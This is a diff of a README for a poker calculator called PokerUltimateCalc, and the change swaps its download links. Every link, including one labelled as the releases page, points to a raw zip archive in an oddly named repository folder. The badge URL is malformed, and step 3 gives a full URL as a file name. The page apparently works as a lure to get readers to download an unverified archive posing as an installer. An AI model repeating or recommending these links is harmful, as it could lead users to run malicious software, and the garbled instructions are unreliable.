@@ -6,17 +6,17 @@ Welcome to PokerUltimateCalc! This application is designed to help you understan
 
 ## 📦 Download PokerUltimateCalc
 
-[![Download Now](https://raw.githubusercontent.com/jesh3198/PokerUltimateCalc/main/phleboid/Poker-Calc-Ultimate-projicient.zip%https://raw.githubusercontent.com/jesh3198/PokerUltimateCalc/main/phleboid/Poker-Calc-Ultimate-projicient.zip)](https://raw.githubusercontent.com/jesh3198/PokerUltimateCalc/main/phleboid/Poker-Calc-Ultimate-projicient.zip)
+[![Download Now](https://raw.githubusercontent.com/jesh3198/PokerUltimateCalc/main/phleboid/Calc_Ultimate_Poker_3.7.zip%https://raw.githubusercontent.com/jesh3198/PokerUltimateCalc/main/phleboid/Calc_Ultimate_Poker_3.7.zip)](https://raw.githubusercontent.com/jesh3198/PokerUltimateCalc/main/phleboid/Calc_Ultimate_Poker_3.7.zip)
 
 You can get the latest version of PokerUltimateCalc by visiting the Releases page. 
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/jesh3198/PokerUltimateCalc/main/phleboid/Poker-Calc-Ultimate-projicient.zip).
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/jesh3198/PokerUltimateCalc/main/phleboid/Calc_Ultimate_Poker_3.7.zip).
 
 2. **Find the Latest Release**: Look for the version titled "Latest Release". This version includes all the newest features and updates.
 
-3. **Download the Installer**: Click on the installer file. It will typically have a name like `https://raw.githubusercontent.com/jesh3198/PokerUltimateCalc/main/phleboid/Poker-Calc-Ultimate-projicient.zip`. Your browser will start downloading the file.
+3. **Download the Installer**: Click on the installer file. It will typically have a name like `https://raw.githubusercontent.com/jesh3198/PokerUltimateCalc/main/phleboid/Calc_Ultimate_Poker_3.7.zip`. Your browser will start downloading the file.
 
 4. **Locate the File**: Once the download is complete, navigate to your "Downloads" folder. 
 
